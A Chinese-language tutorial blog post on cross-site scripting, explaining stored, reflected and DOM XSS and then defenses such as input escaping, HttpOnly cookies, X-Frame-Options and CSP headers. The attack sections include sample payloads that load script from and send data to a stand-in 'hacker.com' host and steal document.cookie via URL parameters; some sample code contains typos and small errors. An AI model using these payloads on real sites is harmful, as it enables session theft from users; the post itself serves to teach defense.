---
title: "08 XSS攻防"
date: 2024-01-01T10:37:34+08:00
categories: ["Web安全和加速"]
tags: ["网络安全","技巧"]
draft: false
code:
  copy: true
toc:
  enable: true
---

> 漏洞扫描可以借助工具：Safe3WVS，Burp Suite ，AWVS，AppScan，W3af，Arachni，Acunetix 等提前自测。

> `XSS（Cross Site Script）`为跨站脚本攻击，取首字母简写为避免和`CSS`冲突而命名。**攻击者通常会向页面嵌入恶意脚本代码，当用于访问时会出发该脚本执行形成攻击。**
>
> **`XSS`的本质就是数据和脚本没有分离，界限混淆，缺少区分处理，使得浏览器渲染数据的同时将脚本一并执行了。**
>
> `XSS`一般可以分为三类：
>
> - 存储型XSS
> - 反射型XSS
> - DOM型XSS

## 一、存储型XSS

> 存储型XSS，是指攻击者利用网页的输入功能，将恶意脚本持久化在服务端，当任意用户访问页面导致该数据被渲染时，恶意脚本便会被浏览器执行，从而形成攻击获取用户本地信息。

攻击者可以利用`<script>`标签做攻击脚本，填写在某个页面的用户数据收集处，比如填写下方内容，其中 xxx.js 就包含了恶意代码。

```html
<script src="http://hacker.com/script/xxx.js"/>
```

```javascript
const xhr = new XMLHttpRequest();
xhr.open('GET', 'http://hacker.com/collectionInfo', true);
xhr.send();
```

上述植入逻辑中的异步请求，在浏览器的同源策略保护下，**可能会出现跨域问题**。此时可以考虑使用一些`DOM`元素的特性来**绕过同源策略**，比如 Image 元素。

```html
<script src="http://hacker.com/script/xxx2.js"/>
```

```javascript
(function() {
   (new Image()).src= 'http://hacker.com/collectionInfo';
});
```

## 二、反射型XSS

> 反射型XSS，是指攻击者不会将恶意脚本持久化在服务端，而是构造一些恶意连接诱导正常用户访问，这类`XSS`的特性是需要和正常用户产生交互。与DOM型XSS的区别是攻击的链接实际上是一些服务端请求链接。

比如对于一个请求链接：`http://www.normal.com/get?uid=`，正常使用的时候，实际上 uid 参数会带上用户的身份标识。攻击者利用这个链接，往往会构造出恶意执行脚本拼接在参数后方，比如：`http://www.normal.com/get?uid=<script>alert(document.cookie)</script>`，只要诱导用户点击来这个链接，则可以窃取用户的登录 cookie 信息。

## 三、DOM型XSS

> DOM型XSS，是一种特殊的反射型XSS，这种类型的`XSS`是利用了`DOM`标签的一些特性，并且不需要和服务端通信。

比如对于一个页面访问请求：`http://www.normal.com/user.html?uid=`，正常使用的时候，实际上 uid 参数会带上用户的身份标识。

攻击者可以利用这个链接，构造一个虚假的DOM元素出来，比如：`http://www.normal.com/user.html?uid=<input type="button" value="登录" onClick="alter(document.cookie)"/>`，也可以不需要和用户交互的：`http://www.normal.com/user.html?uid=<img src='notFound.jpg' onerror="alter(document.cookie)"/>`

## 四、防护策略

> `XSS`攻击的防护策略主要就是针对其本质做对应的加固，也即，将数据和脚本做区分，对于疑似脚本的数据做转义处理

1. 在网关或者过滤器等请求流量入口处，做参数合法性校验（长度或特殊字符），以及针对特殊字符的转义处理。

   ```java
   // 方式一：自定义处理方式，将特殊字符映射为全角字符（输入）
   public static String xssEncoding(String param) {
       if (param == null || param.isEmpty()) {
           return param;
       }
       StringBuilder sb = new StringBuilder(param.length() + 16);
       for(int i=0; i < param.length(); i++) {
           char c = param.charAt(i);
           switch (c) {
               case '>':
                   sb.append('>'); // 全角大于号
                   break;
               // etc.
           }
       }
       return sb.toString();
   }
   ```

   ```java
   // 方式二：借助第三方库做特殊字符转义（输入）
   /**
    * <groupId>org.owasp.antisamy</groupId>
    * <artifactId>antisamy</artifactId>
    */
   public class XssEncoder {
       private static Policy policy = null;
       
       static {
           String path = XssEncoder.class.getClassLoader().getResource("antisamy-anythinggoes.xml").getFile();
           if (path.startsWith("file")) {
               path = path.substring(6);
           }
           try {
               policy = Policy.getInstance(path);
           } catch (Exception e) {
               throw new RuntimeException(e);
           }
       }
       
       public static String xssEncode(String param) {
           AntiSamy antiSamy = new AntiSamy();
           try {
               Clean Results cr = antiSamy.scan(param, policy);
               // 输出安全的 HTML
               return cr.getCleanHTML();
           } catch (Exception e) {
               throw new RuntimeException(e);
           }
       }
   }
   ```

   ```java
   // 方式三：借助第三方库做特殊字符转义（输入）
   /**
    * <groupId>org.apache.commons</groupId>
    * <artifactId>commons-text</artifactId>
    */
   public class XssEncoder {
       public static String xssEncode(String param) {
           // return StringEscapeUtils.escapeJson(param);
           // return StringEscapeUtils.escapeEcmaScript(param);
           return StringEscapeUtils.escapeHtml4(param);
       }
   }
   ```

   ```java
   // 方式四：借助第三方库做特殊字符转义（输出）
   /**
    * <groupId>org.owasp.esapi</groupId>
    * <artifactId>esapi</artifactId>
    */
   ```

2. 为响应的`Cookie`设置只读属性（如果是`SpringBoot`项目，属性`server.servlet.session.cookie.http-only`默认就是`true`开启的），或者为响应资源禁用`iframe`策略

   ```java
   // 设置 cookie 只读属性的方式
   response.setHeader("SET-COOKIE", "JSESSIONID=" + request.getSession().getId() + "; HttpOnly");
   // 设置响应对于 iframe 的策略（SAMEORIGIN表示同域名下可以挂iframe；DENY表示不允许；ALLOW-FROM uri表示指定uri的地址可以挂）
   response.setHeader("x-frame-options", "SAMEORIGIN");
   ```

   ```nginx
   // 设置响应对于 iframe 的策略
   add_header X-Frame-Options SAMEORIGIN;
   ```

3. 使用`CSP`协议为响应资源限制加载策略

   > `CSP（Content-Security-Policy）`内容安全策略是一个额外的安全层，用于检测并削弱某些特定类型的攻击，包括跨站脚本 (XSS) 和数据注入攻击等。
   >
   > 核心思想：网站通过发送一个 CSP 头部，来告诉浏览器什么是被授权执行的与什么是需要被禁止的。
   >
   > `CSP`有两种配置：
   >
   > - Content-Security-Policy：配置好并启用后，不符合 CSP 的外部资源就会被阻止加载
   > - Content-Security-Policy-Report-Only：表示**不限制选项执行**，只是记录违反限制的行为。它必须与 report-uri 选项配合使用

   ```nginx
   # Filter 配置方式可参考，此处演示 Nginx 的配置方式
   # 也可用于 HTML 的 <meta http-equiv="content-security-policy" content="xxx"/> 标签指定
   add_header Content-Security-Policy default-src 'self' *.yiwenup.cloud # 表示限制所有外部资源，仅从指定域名及子域名加载
   add_header Content-Security-Policy default-src 'self'; img-src *; media-src media1.com media2.com; script-src script.yiwenup.cloud; report-uri /_/csp-reports # 表示图片可以从任意地方加载，媒体文件仅从指定位置加载，脚本文件仅从指定位置加载，对于违例的访问将记录信息发送至 csp-reports 处理
   ```

   ```json
   // CSP 报告的请求格式
   {
       "csp-report": {
           "document-uri": "xxxx",
           "referrer": "",
           "block-uri": "yyyyy",
           "violated-directive": "ppppp",
           "original-policy": "default-src 'self'; img-src *; media-src media1.com media2.com; script-src script.yiwenup.cloud; report-uri /_/csp-reports"
       }
   }
   ```

   
